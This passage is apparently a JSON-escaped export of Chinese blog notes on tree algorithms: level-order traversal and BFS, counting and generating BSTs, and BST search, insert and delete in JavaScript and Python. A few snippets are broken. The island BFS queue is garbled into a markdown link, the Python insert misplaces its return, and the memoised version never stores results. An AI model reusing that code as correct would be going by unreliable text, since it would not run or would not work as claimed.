二叉搜索树中的搜索](https://leetcode.cn/problems/search-in-a-binary-search-tree/)|🟢|\n|[701. Insert into a Binary Search Tree](https://leetcode.com/problems/insert-into-a-binary-search-tree/)|[701. 二叉搜索树中的插入操作](https://leetcode.cn/problems/insert-into-a-binary-search-tree/)|🟠|\n|[98. Validate Binary Search Tree](https://leetcode.com/problems/validate-binary-search-tree/)|[98. 验证二叉搜索树](https://leetcode.cn/problems/validate-binary-search-tree/)|🟠|\n","4ZwVHQch":"\n# 二叉树的层次遍历与 BFS 算法\n\n\n\n## 目录\n<!-- toc -->\n ## 1. [二叉树的层序遍历](https://leetcode.cn/problems/binary-tree-level-order-traversal/) \n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/dd5bac7e1d5221a13ccb0336ce2d97d4.png)\n\n- 注意是`队列`，所以是 `push` 和 `shift`，而不是 `pop` \n\t- `while 循环`，管从上到下\n\t- `for 循环`， 分管和从左到右的遍历\n\n![image.png|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/e80c234bde21ae68b50486fcd25f1061.png)\n\n```javascript\n\n/*\n * @param {TreeNode} root\n * @return {number[][]}\n */\nvar levelOrder = function (root) {\n    // 如果根节点为空，则返回空数组\n    if (root === null) return [];\n    // 返回的结果\n    const res = [];\n    // 辅助队列,初始化队列，首先加入根节点\n    const q = [root];\n\n    while (q.length) {\n        const size = q.length;\n        // 用于存储当前层的节点值\n        const currentLevel = [];\n        for (let i = 0; i < size; i++) {\n            // :::::出队列\n            const node = q.shift();\n            currentLevel.push(node.val);\n            // :::::左节点先入队列\n            if (node.left) {\n                q.push(node.left);\n            }\n            // :::::右节点后入队列\n            if (node.right) {\n                q.push(node.right);\n            }\n        }\n        res.push(currentLevel);\n    }\n\n    return res;\n\n};\n\n```\n\n## 2. [二叉树的层序遍历 II](https://leetcode.cn/problems/binary-tree-level-order-traversal-ii/)\n\n![image.png|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/2f5d6564554331c98fae7653b638f281.png)\n\n 反过来\n -  从下到上\n - 从左到右\n \n```javascript hl:30\n/*\n * @param {TreeNode} root\n * @return {number[][]}\n */\nvar levelOrderBottom = function (root) {\n    // 如果根节点为空，则返回空数组\n    if (root === null) return [];\n    // 返回的结果\n    const res = [];\n    // 辅助队列,初始化队列，首先加入根节点\n    const q = [root];\n\n    while (q.length) {\n        const size = q.length;\n        // 用于存储当前层的节点值\n        const currentLevel = [];\n        for (let i = 0; i < size; i++) {\n            // :::::出队列\n            const node = q.shift();\n            currentLevel.push(node.val);\n            // :::::左节点先入队列\n            if (node.left) {\n                q.push(node.left);\n            }\n            // :::::右节点后入队列\n            if (node.right) {\n                q.push(node.right);\n            }\n        }\n        res.unshift(currentLevel);\n    }\n\n    return res;\n\n};\n\n```\n\n- 只需要改一个 `地方` ，如上\n- 问：如果遍历，改成 `从上到下`， `从右到左` 呢 ？\t\n    - 同样，在 `for 循环` 里做文章\n\n## 3. [二叉树的最小深度](https://leetcode.cn/problems/minimum-depth-of-binary-tree/)\n\n这道题，前面使用`二叉树遍历的思路`和`分解问题的思路`都解过，这里使用 `层次遍历的思路（或者说是层次遍历框架）`来解决\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number}\n */\n// ::::层次遍历的思路\nvar minDepth = function (root) {\n    //   ::::如果根节点为空，直接返回0\n    if (root === null) return 0;\n    // ::::默认深度为1\n    let depth = 1;\n    /**\n     * ::::层次遍历框架\n     */\n    let q = [root];\n\n    while (q.length) {\n        const size = q.length;\n        for (let i = 0; i < size; i++) {\n            // ::::注意：是 shift() 而不是 pop()\n            const node = q.shift();\n            // ::::如果到达叶子节点，返回深度\n            if (node.left === null && node.right === null) {\n                return depth;\n            }\n            if (node.left) {\n                q.push(node.left);\n            }\n            if (node.right) {\n                q.push(node.right);\n            }\n        }\n        // ::::深度加一\n        depth++;\n    }\n};\n```\n\n- 注意点：一般来讲，`层次遍历`特别适合来求`最小值` ，请问这是为什么呢？\n    - 回答：这里省略，想想就就知道了，再结合下图看看就明白了\n        - ![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/e80c234bde21ae68b50486fcd25f1061.png)\n- 另：一般来讲，层次遍历复杂度低于 DFS？\n    - 因为不一定需要遍历完成，中途找到了就返回了\n\n## 4. [最大层内元素和](https://leetcode.cn/problems/maximum-level-sum-of-a-binary-tree/)\n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/6a912bcd4a453071884f3f4c510d2196.png)\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number}\n */\nvar maxLevelSum = function (root) {\n    // ::::::::如果根节点为空，直接返回0\n    if (root === null) {\n        return 0;\n    }\n    // ::::::::层次\n    let depth = 1;\n    // ::::::::结果\n    let res = 0;\n    // ::::::::最大值,默认为最小值\n    // let maxSum = -100000;\n    let maxSum = -Infinity;\n    let q = [root];\n    while (q.length) {\n        let size = q.length;\n        let levelSum = 0;\n        for (let i = 0; i < size; i++) {\n            // ::::::::出队列,注意，这个是在 for 循环中的\n            const node = q.shift();\n            levelSum += node.val\n            if (node.left !== null) {\n                q.push(node.left)\n            }\n            if (node.right !== null) {\n                q.push(node.right);\n            }\n        }\n        if (levelSum > maxSum) {\n            res = depth;\n            maxSum = levelSum;\n        }\n        depth++;\n    }\n    return res;\n};\n\n```\n\n- 一个技巧：如果忘了 `-Infinity` ，则可以直接写成题设中的`最小值`，是 `10000`\n- `const node = q.shift();` 是在` for 循环`里面\n\n## 5. [N 叉树的层序遍历](https://leetcode.cn/problems/n-ary-tree-level-order-traversal/)\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/4a4b1ffb2de4d27a1f984f490be949ec.png)\n\n```javascript\n\n /**\n * @param {Node|null} root\n * @return {number[][]}\n */\nvar levelOrder = function (root) {\n    // ::::::::如果根节点为空，则返回空数组\n    if (root === null) {\n        return [];\n    }\n    // ::::::::返回的结果\n    let res = [];\n    // ::::::::辅助队列,初始化队列，首先加入根节点\n    let q = [root];\n    /**\n     * ::::::::层次遍历框架：队列不为空时，循环\n     **/\n    while (q.length) {\n        // ::::::::用于存储当前层的节点值\n        let level = [];\n        let size = q.length;\n        for (let i = 0; i < size; i++) {\n            // ::::::::出队列\n            const node = q.shift();\n            level.push(node.val);\n            // ::::::::遍历子节点，入队列,多叉树的子节点是一个数组\n            for (let item of node.children) {\n                q.push(item);\n            }\n        }\n        res.push(level);\n    }\n\n    return res;\n};\n```\n\n两个要点：\n- 层次遍历的框架，一定无误的默写出来\n- 多叉树，比二叉树，只是从 `node.left 和 node.right`  变成了  `node.children`  而已\n\n## 6. `递归`的方式实现`层序遍历`\n\n```javascript\nvar levelTraverse = function (root) {\n    let res = [];\n    // ::::关键是把 depth、res 作为参数传入\n    traverse(root, 0, res);\n    return res;\n};\n\n/**\n * @description 递归遍历\n * @param {TreeNode} root\n * @param {number} depth\n * @param {number[][]} res\n * */\nfunction traverse(root, depth, res) {\n    if (root == null) {\n        return;\n    }\n    // 前序位置，看看是否已经存储 depth 层的节点了\n    if (res.length <= depth) {\n        // 第一次进入 depth 层\n        res.push([]);\n    }\n\n    // 前序位置，在 depth 层添加 root 节点的值\n    res[depth].push(root.val);\n    traverse(root.left, depth + 1, res);\n    traverse(root.right, depth + 1, res);\n}\n```\n\n- 这种思路从结果上说确实可以得到层序遍历结果，\n    - 但其`本质`还是二叉树的前序遍历，或者说 DFS 的思路，而不是层序遍历，或者说 BFS 的思路\n    - `因为`这个解法是依赖`前序遍历自顶向下、自左向右`的顺序特点得到了正确的结果。\n- 抽象点说，这个解法更像是从左到右的「列序遍历」，而不是自顶向下的「层序遍历」。\n\t- 所以对于计算最小距离的场景，这个解法完全等同于 DFS 算法，没有 BFS 算法的性能的优势。\n\n## 7. `扩散` 到 `BFS算法`：[岛屿数量](https://leetcode.cn/problems/number-of-islands/)\n\n- 其实，`层次遍历` 扩散后就是 `BFS算法`\n\t- 二叉树的`层次遍历`是：`for循环` 中`扩散`  `左右子节点`\n\t- 多叉树的`层次遍历`是：`for循环` 中`扩散`  `children子节点`\n\t- 岛屿问题的 `层次遍历`是：`for循环` 中`扩散`  `上下左右节点` ，如下图：\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/24d04b560b16db3c6049f57b2b37d476.png)\n\n![image.png|488](https://832-1310531898.cos.ap-beijing.myqcloud.com/2b15033aff9a4463aa0c2c7ad1a59f47.png)\n\n```javascript\n/**\n * @param {character[][]} grid\n * @return {number}\n */\nvar numIslands = function (grid) {\n    let res = 0;\n    // ::::::::行数\n    const m = grid.length;\n    if (m === 0) {\n        return res;\n    }\n    // ::::::::列数\n    const n = grid[0].length;\n    // ::::::::遍历整个二维数组\n    for (let i = 0; i < m; i++) {\n        for (let j = 0; j < n; j++) {\n            // ::::::::如果当前位置是岛屿\n            if (grid[i][j] === '1') {\n                // ::::::::岛屿数量加一\n                res++;\n                //:::: 然后使用 DFS 将岛屿淹了\n                bfs(grid, i, j);\n            }\n        }\n    }\n    return res;\n};\n\n/**\n * @description ::::从 (i, j) 开始，将与之相邻的陆地都变成海水\n * */\nvar bfs = function (grid, i, j) {\n    // ::::::::行数\n    const m = grid.length;\n    // ::::::::列数\n    const n = grid[0].length;\n    // ::::::::辅助队列,初始化队列，首先加入根节点\n    const q = [i, j](/post/4ZwVHQch.html#i,-j);\n\n    // :::: 将当前位置的值置标识为 0，即将岛屿淹了\n    grid[i][j] = '0';\n\n    while (q.length) {\n        let size = q.length;\n        for (let k = 0; k < size; k++) {\n            const [x, y] = q.shift();\n            // ::::上边,如果上边是陆地，则入队列,并且将陆地变成海水\n            if (y - 1 >= 0 && grid[x][y - 1] === '1') {\n                q.push([x, y - 1]);\n                grid[x][y - 1] = '0';\n            }\n            // 下边,如果下边是陆地，则入队列,并且将陆地变成海水\n            if (y + 1 < n && grid[x][y + 1] === '1') {\n                q.push([x, y + 1]);\n                grid[x][y + 1] = '0';\n            }\n            // 左边,如果左边是陆地，则入队列,并且将陆地变成海水\n            if (x - 1 >= 0 && grid[x - 1][y] === '1') {\n                q.push([x - 1, y]);\n                grid[x - 1][y] = '0';\n            }\n            // 右边,如果右边是陆地，则入队列,并且将陆地变成海水\n            if (x + 1 < m && grid[x + 1][y] === '1') {\n                q.push([x + 1, y]);\n                grid[x + 1][y] = '0';\n            }\n        }\n    }\n}\n\n```\n\n> 当然，这个题还有 `DFS 解法` ，后文会提到\n\n## 8. 总结\n\n- 很多网格，二维数组类（如岛屿问题）题目可以使用这种 `层次遍历框架`\n- 很多最小值问题，智力最小值问题等可以考虑使用 `层次遍历框架`\n- 请务必牢记 `层次遍历框架`，记着了框架这些题都能写出来\n- `层次遍历框架` 及 `BFS 算法`的关系是什么，请回答？\n\t1. 层次遍历继承了BFS的核心思想，但更专注于树的特定需求\n\t2. 层次遍历通常不需要visited集合，因为树没有环\n\t3. 层次遍历常常需要记录层次信息，而普通BFS不需要\n\t4. 层次遍历是BFS在树结构上的特化版本\n\t5. 两者都基于队列实现，保证了从近到远的访问顺序\n\n","KWc7uS6u":"\n# 二叉搜索树（篇三：BST 的构造）\n\n`#BST` `#leetcode`  `#二叉树/二叉搜索树`   `#2024/09/08` \n\n\n## 目录\n<!-- toc -->\n ## 1. `n` 个节点能组成多少个 BST ？ \n\n### 1.1. 题目\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908135259.png)\n\n比如，`n = 3` 时，有 5 种 BST，如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908135507.png)\n\n### 1.2. 解题思路\n\n又比如，`n = 5` 时，也就是说用 `{1,2,3,4,5}` 这些数字去构造 BST。\n\n-  **根节点**总共有有 `5 种`情况，因为每个数字都可以作为**根节点**。\n\t-  `3` 作为根节点时\n\t\t- 左子树节点就是 `{1,2}` 的组合\n\t\t- 右子树就是 `{4,5}` 的组合\n\t\t- 然后 左子树的组合数和右子树的组合数**乘积**就是 `3` 作为根节点时的 BST 个数。\n\n基本逻辑写好，然后写个递归，交给递归就行\n\n### 1.3. 代码\n\n```javascript\n/**\n * @param {number} n\n * @return {number}\n */\nvar numTrees = function (n) {\n  return count(1, n);\n};\n\n/**\n * @description [low,high] 范围内构建二叉搜索树的数量\n */\nfunction count(lo, hi) {\n  // base case\n  // 显然当 lo > hi 闭区间 [lo, hi] 肯定是个空区间，也就对应着空节点 null\n  // 虽然是空节点，但是也是一种情况，所以要返回 1 而不能返回 0\n  if (lo > hi) {\n    return 1;\n  }\n\n  let res = 0;\n\n  for (let i = lo; i <= hi; i++) {\n    /// 以 root.val = i 时的根节点，左子树的数量\n    // 为什么是 i - 1 而不是 i？\n    // 因为 i 代表的是根节点的值，所以左子树的范围是 [lo, i - 1]\n    let left = count(lo, i - 1);\n    /// 以 root.val = i 时的根节点，右子树的数量\n    // 为什么 i + 1 而不是 i？\n    // 因为 i 代表的是根节点的值，所以右子树的范围是 [i + 1, hi]\n    let right = count(i + 1, hi);\n    // 以 i 为根节点时，左右子树的组合数量的乘积\n    // 就是以 i 为根节点时，BST 的数量\n    // 为什么要乘积？\n    // 因为对于每个根节点，左右子树的组合数量是独立的\n    // 比如说，左子树有 3 种组合，右子树有 5 种组合\n    // 那么以当前根节点构建的 BST 就有 3 * 5 = 15 种组合\n    res += left * right;\n  }\n\n  return res;\n}\n\n```\n\n> leetcode上超时了\n\n### 1.4. 优化：使用备忘录\n\n```javascript hl:2,14\nvar numTrees = function (n) {\n  // meme[i][j] 代表 i 到 j 的二叉搜索树的个数\n  const memo = [];\n  for (let i = 0; i < n + 1; i++) {\n    memo[i] = [];\n    for (let j = 0; j < n + 1; j++) {\n      memo[i][j] = 0;\n    }\n  }\n  function count(lo, hi) {\n    if (lo > hi) {\n      return 1;\n    }\n    // 先查找备忘录\n    if (memo[lo][hi] !== 0) {\n      return memo[lo][hi];\n    }\n    let res = 0;\n    for (let i = lo; i <= hi; i++) {\n      let left = count(lo, i - 1);\n      let right = count(i + 1, hi);\n      res += left * right;\n    }\n    return res;\n  }\n\n  return count(1, n);\n};\n\n```\n\n> leetcode上还是超时了\n\n### 1.5. 动态规划解法 \n\n```javascript hl:14\nvar numTrees = function (n) {\n  const dp = new Array(n + 1).fill(0);\n  // dp[i] 代表 i 个节点的 BST 个数\n  // dp[0] = 1, dp[1] = 1 代表空树和一个节点的 BST 个数都是 1\n  dp[0] = 1;\n  dp[1] = 1;\n  // 从 2 开始计算\n  for (let i = 2; i <= n; i++) {\n    for (let j = 1; j <= i; j++) {\n      // j 代表根节点的值\n      // 左子树的节点个数为 j - 1, 右子树的节点个数为 i - j ?\n      // why? 看后面有截图解释\n      // 左子树的 BST 个数为 dp[j - 1], 右子树的 BST 个数为 dp[i - j]\n      // 以 j 为根节点的 BST 个数为 dp[j - 1] * dp[i - j]\n      dp[i] += dp[j - 1] * dp[i - j];\n    }\n  }\n  return dp[n];\n};\n```\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908163823.png)\n\n> 能正常通过 leetcode\n\n## 2. `n` 个节点能组成的所有 BST \n\n```javascript\n/**\n * Definition for a binary tree node.\n * function TreeNode(val, left, right) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.left = (left===undefined ? null : left)\n *     this.right = (right===undefined ? null : right)\n * }\n */\n/**\n * @param {number} n\n * @return {TreeNode[]}\n */\nvar generateTrees = function (n) {\n  if (n === 0) {\n    return [];\n  }\n  return build(1, n);\n};\n\n/**\n *@description 生成[lo,hi]区间的所有二叉搜索树\n *@param {*} lo\n *@param {*} hi\n */\nfunction build(lo, hi) {\n  let res = [];\n  // 递归的出口,空节点\n  // lo > hi 代表空节点,即没有节点的二叉树\n  // 为什么是 null 而不是 [] ?\n  // 因为 null 代表空节点, [] 代表空数组, 代表有一个节点的二叉树\n  if (lo > hi) {\n    res.push(null);\n    return res;\n  }\n  // 穷举 root 节点的所有可能\n  for (let i = lo; i <= hi; i++) {\n    // 递归构造出左右子树的所有有效 BST=>递归构造左右子树\n    let left = build(lo, i - 1);\n    let right = build(i + 1, hi);\n    // 给 root 节点穷举所有左右子树的组合\n    for (let leftNode of left) {\n      for (let rightNode of right) {\n        let root = new TreeNode(i);\n        root.left = leftNode;\n        root.right = rightNode;\n        res.push(root);\n      }\n    }\n  }\n  return res;\n}\n```\n\n## 3. 相关题目\n\n| LeetCode                                                                                          | 力扣                                                                             | 难度  |\n| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | --- |\n| [95. Unique Binary Search Trees II](https://leetcode.com/problems/unique-binary-search-trees-ii/) | [95. 不同的二叉搜索树 II](https://leetcode.cn/problems/unique-binary-search-trees-ii/) | 🟠  |\n| [96. Unique Binary Search Trees](https://leetcode.com/problems/unique-binary-search-trees/)       | [96. 不同的二叉搜索树](https://leetcode.cn/problems/unique-binary-search-trees/)       | 🟠  |\n\n## 4. 参考\n\nhttps://labuladong.online/algo/data-structure/bst-part3/\n","qVVhA752":"\n# 多叉树的遍历：Python 描述\n\n`#多叉树` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 1. 多叉树的层次遍历 \n\n```python\nfrom collections import deque\n\n# 二叉树的节点\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\n# 多叉树的节点\nclass Node:\n    def __init__(self, val):\n        self.val = val\n        # 孩子节点\n        self.children = []\n\n# 多叉树的层次遍历\ndef level_order(root:Node):\n    if root is None:\n        return []\n    # 用队列保存节点\n    queue = deque()\n    # 结果\n    res = []\n    # 根节点入队\n    queue.append(root)\n    # 遍历\n    while queue:\n        # 当前层的节点\n        level = []\n        # 当前层的节点个数\n        size = len(queue)\n        # 遍历当前层的节点\n        for i in range(size):\n            # 出队\n            node = queue.popleft()\n            # 节点值加入当前层\n            level.append(node.val)\n            # 孩子节点入队\n            for child in node.children:\n                queue.append(child)\n        # 当前层加入结果\n        res.append(level)\n    return res\n\n```\n\n\n## 2. 多叉树的中序遍历\n\n很明显，没有中序\n\n## 3. 多叉树的前序和后序遍历\n\n```python\nfrom collections import deque\n\n# 二叉树的节点\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\n# 多叉树的节点\nclass Node:\n    def __init__(self, val):\n        self.val = val\n        # 孩子节点\n        self.children = []\n\n# 多叉树的前序和后续遍历\n\n# 前序遍历\ndef preorder(root:Node):\n    if root is None:\n        return\n    print(root.val)\n    for child in root.children:\n        preorder(child)\n\n# 后序遍历\ndef postorder(root:Node):\n    if root is None:\n        return\n    ###### 前序位置  #####\n    for child in root.children:\n        postorder(child)\n    ##### 后序位置  #####\n    print(root.val)\n\n```","yuJmUhpB":"\n# 二叉搜索树（篇四：BST 的后序位置）\n\n`#BST` `#leetcode`  `#二叉树/二叉搜索树`   `#2024/09/10` \n\n---\n\n本文会讲解以下题目：\n\n| LeetCode                                                                                              | 力扣                                                                                 | 难度  |\n| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | --- |\n| [1373. Maximum Sum BST in Binary Tree](https://leetcode.com/problems/maximum-sum-bst-in-binary-tree/) | [1373. 二叉搜索子树的最大键值和](https://leetcode.cn/problems/maximum-sum-bst-in-binary-tree/) | 🔴  |\n\n\n## 目录\n<!-- toc -->\n ## 1. 首先，后序有什么特殊之处？ \n\n- **前序**位置的代码只能从**函数参数**中获取父节点传递来的数据\n- 而**后序**位置的代码**不仅**可以获取参数数据，**还**可以拿到**子树通过函数返回的值**\n\t- 后序位置的代码，有时候可以大幅提升算法效率，比如本文需要讲解的题目\n\n> 换句话说，一旦你发现**题目和子树有关**，那大概率要给函数设置合理的定义和返回值，在后序位置写代码了。\n\n## 2. 题目分析\n\n题目会给你输入一棵二叉树，请你找到**节点之和最大的**那棵二叉搜索树，并返回它的节点值之和。\n\n![cos-blog-832-34-20241012|568](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240910082418.png)\n\n![cos-blog-832-34-20241012|464](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240910082555.png)\n\n## 3. 思路\n\n二叉树相关题目最核心的思路是**明确当前节点需要做的事情是什么**\n- ①  左右子树是否是 BST\n- ②  左子树的最大值 `leftMax` 和右子树的最小值 `rightMin`，为了 ③ 的判断\n- ③  左右子树的节点值之和 `rootSum`， 为了判断 `左右子树+该节点` 是否是 BST\n\n## 4. 基本框架\n\n```javascript\nvar maxSumBST = function () {\n  // 全局变量，记录 BST 最大节点之和\n  var maxSum = 0;\n\n  // 遍历二叉树\n  var traverse = function (root) {\n    if (root === null) {\n      return;\n    }\n    // ******* 前序遍历位置 *******\n    // ① 判断左右子树是不是 BST 二叉搜索树\n    if (isBST(root.left) && isBST(root.right)) {\n      // ② 计算左子树的最大值和右子树的最小值\n      var leftMax = findMax(root.left);\n      var rightMin = findMin(root.right);\n      // ③ 判断以 root 节点为根的树是不是 BST\n      if (root.val > leftMax && root.val < rightMin) {\n        // 如果条件都符合，计算当前 BST 的节点之和\n        var leftSum = findSum(root.left);\n        var rightSum = findSum(root.right);\n        var rootSum = leftSum + rightSum + root.val;\n        // 计算 BST 节点的最大和\n        maxSum = Math.max(maxSum, rootSum);\n      }\n    }\n    // 二叉树遍历框架，遍历子树节点\n    traverse(root.left);\n    traverse(root.right);\n  };\n\n  traverse(root);\n  return maxSum;\n};\n\n// 计算以 root 为根的二叉树的最大值\nvar findMax = function (root) {};\n\n// 计算以 root 为根的二叉树的最小值\nvar findMin = function (root) {};\n\n// 计算以 root 为根的二叉树的节点和\nvar findSum = function (root) {};\n\n// 判断以 root 为根的二叉树是否是 BST\nvar isBST = function (root) {};\n\n```\n\n### 4.1. 问题\n\n这几个辅助函数都是递归函数，递归里套递归，复杂度极高，`O(N^2)`\n\n## 5. 优化\n\n前序改成后序，后序遍历的时候，让 `traverse` 函数把辅助函数做的事情顺便做掉\n\n```javascript\nvar maxSumBST = function (root) {\n  // 记录 BST 最大节点之和\n  var maxSum = 0;\n\n  // 计算以 root 为根的二叉树的最大值、最小值、节点和\n  /**\n   * @description 计算以 root 为根的二叉树的 [最大值、最小值、节点和]\n   * @param {TreeNode} root\n   * @return {Array} \n   * [是否 BST（0 不是，1 是）, 所有节点中的最小值, 所有节点中的最大值, 所有节点值之和]\n   */\n  var findMaxMinSum = function (root) {\n    // base case\n    if (root === null) {\n      return [1, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER, 0];\n    }\n\n    // 递归计算左右子树\n    var left = findMaxMinSum(root.left);\n    var right = findMaxMinSum(root.right);\n\n    // ******* 后序遍历位置 *******\n    // 通过 left 和 right 推导返回值\n    // 并且正确更新 maxSum 变量\n    var res = [0, 0, 0, 0];\n    // 若左右子树都是 BST，且 root 大于左子树的最大值，小于右子树的最小值\n    // 则以 root 为根的二叉树是 BST, 更新 res\n    if (\n      left[0] === 1 &&\n      right[0] === 1 &&\n      root.val > left[2] &&\n      root.val < right[1]\n    ) {\n      // 以 root 为根的二叉树是 BST\n      res[0] = 1;\n      // 计算以 root 为根的这棵 BST 的最小值\n      res[1] = Math.min(left[1], root.val);\n      // 计算以 root 为根的这棵 BST 的最大值\n      res[2] = Math.max(right[2], root.val);\n      // 计算以 root 为根的这棵 BST 所有节点之和\n      res[3] = left[3] + right[3] + root.val;\n      // 更新全局变量\n      maxSum = Math.max(maxSum, res[3]);\n      // 否则，以 root 为根的二叉树不是 BST\n    } else {\n      // 以 root 为根的二叉树不是 BST\n      res[0] = 0;\n      // 其他的值都没必要计算了，因为用不到\n    }\n    return res;\n  };\n  findMaxMinSum(root);\n  return maxSum;\n};\n```\n\n### 5.1. 复杂度分析\n\n时间复杂度只有 `O(N)`\n\n## 6. 最后\n\n为什么这道题用**后序遍历**有奇效呢，因为**我们需要的这些变量全都可以通过子问题的结果推到出来**，适合用**分解问题的思路**求解。比如\n- 计算以 `root` 为根的二叉树的节点之和，是不是可以通过左右子树的和加上 `root.val` 计算出来？\n- 计算以 `root` 为根的二叉树的最大值/最小值，是不是可以通过左右子树的最大值/最小值和 `root.val` 比较出来？\n- 判断以 `root` 为根的二叉树是不是 BST，是不是得先判断左右子树是不是 BST？是不是还得看看左右子树的最大值和最小值？\n\n## 7. 参考\n\nhttps://labuladong.online/algo/data-structure/bst-part4/\n\n","9MHmYpLt":"\n# 二叉搜索树：Python 描述\n\n`#BST` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 1. 二叉搜索树（BST） \n\n- 一种特殊的二叉树，`较小`的值保存在`左节点`中，`较大`的值保存在`右节点`中\n   - `根节点的左子树`都比`根节点的值`小，`右子树的值`都比`根节点的值`大。\n   - `二叉查找树`是一种`有序的树`，所以支持`快速查找、快速插入、删除`一个数据\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/26939446c9517db965095fb586848172.png)\n\n## 2. 二叉树效率：都是 O(n)\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922204133.png)\n## 3. 二叉树的查找：复杂度 O(logn)\n\n```python\n# BST的搜索\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\n# BST的搜索\ndef search(root:TreeNode, val:int) -> TreeNode | None:\n    # 如果根节点为空，返回空\n    if root is None:\n        return None\n    # 如果根节点的值等于 val，返回根节点\n    if root.val == val:\n        return root\n    # 如果根节点的值大于 val，递归搜索左子树\n    if root.val > val:\n        if root.left is None:\n            return None\n        return search(root.left, val)\n    # 如果根节点的值小于 val，递归搜索右子树\n    if root.val < val:\n        if root.right is None:\n            return None\n        return search(root.right, val)\n\n```\n\n## 4. BST 的遍历：中序遍历升序\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922194611.png)\n\n## 5. 插入节点：复杂度 O(logn)\n\n> [!danger]\n> 二叉搜索树**不允许存在重复节点**，否则将违反其定义\n> \n> 因为BST的特性，所以插入的节点**肯定会到叶子结点**\n\n1. **查找插入位置**\n\t- 与查找操作相似，从根节点出发，根据当前节点值和 `num` 的大小关系循环向下搜索，直到越过叶节点（遍历至 `None` ）时跳出循环。\n2. **在该位置插入节点**\n\t- 初始化节点 `num` ，将该节点置于 `None` 的位置\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922195422.png)\n\n或者看下面一张图，在下图的树中插入健值为 `6` 的节点，一定是叶子节点对吧\n\n![|399](https://832-1310531898.cos.ap-beijing.myqcloud.com/8963bb8f3b7b3a6a1fa71319e058bde3.png)\n\n代码：\n\n```python\n# TreeNode 类型的定义\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\n# BST的插入，复杂度 O(logn)\ndef insert(root:TreeNode, val:int) -> TreeNode:\n    # 如果根节点为空，返回一个新节点\n    if root is None:\n        return TreeNode(val)\n\n    # 如果根节点的值大于 val，递归插入左子树\n    if root.val > val:\n        if root.left is None:\n            root.left = TreeNode(val)\n        root.left = insert(root.left, val)\n\n    # 如果根节点的值小于 val，递归插入右子树\n    if root.val < val:\n        if root.right is None:\n            root.right = TreeNode(val)\n        root.right = insert(root.right, val)\n\nreturn root\n```\n\n## 6. 移除节点\n\n### 6.1. 第一种情况：叶子结点\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922200912.png)\n\n### 6.2. 第二种情况：有一个节点\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922201130.png)\n\n### 6.3. 第三种情况：`两个子节点`的节点\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922203639.png)\n\n1. 找到 `4`\n2. 找到 `4` 的**右边**最小的节点 `5`\n3. 把 `4 的位置`替换成 `5`\n4. 递归从从**右侧子树**中移除**最小节点**\n\t- 这个最小值一定是 5，并且是满足**第一种情况：是叶子结点**\n\n### 6.4. 最终代码\n\n```python\n# TreeNode 类型的定义\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\n# BST的删除\ndef deleteNode(root:TreeNode, key:int) -> TreeNode | None:\n\n    # 如果根节点为空，直接返回\n    if root is None:\n        return None\n\n    # 如果根节点的值等于 key\n    if root.val == key:\n\n        \"\"\"第一种情况：叶子结点直接删除\"\"\"\n        # 如果左右孩子都为空，直接删除\n        if root.left is None and root.right is None:\n            return None\n\n        \"\"\"第二种情况：左孩子或者右孩子为空\"\"\"\n        # 如果左孩子为空，返回右孩子\n        if root.left is None:\n            return root.right\n        # 如果右孩子为空，返回左孩子\n        if root.right is None:\n            return root.left\n\n        \"\"\"走到这里说明是第三种情况：左右孩子都不为空\"\"\"\n        # 如果左右孩子都不为空\n        # 找到右子树的最小值\n        minNode = getMin(root.right)\n        # 将 root 的值替换为 minNode 的值\n        root.val = minNode.val\n        # 删除 minNode\n        root.right = deleteNode(root.right, minNode.val)\n    \n    # 如果根节点的值小于 key\n    elif root.val < key:\n        if root.right is None:\n            return root\n        # 递归删除右子树\n        root.right = deleteNode(root.right, key)\n    # 如果根节点的值大于 key\n    else:\n        if root.left is None:\n            return root\n        # 递归删除左子树\n        root.left = deleteNode(root.left, key)\n\n    # 返回根节点\n    return root\n\n# 找到最小值\ndef 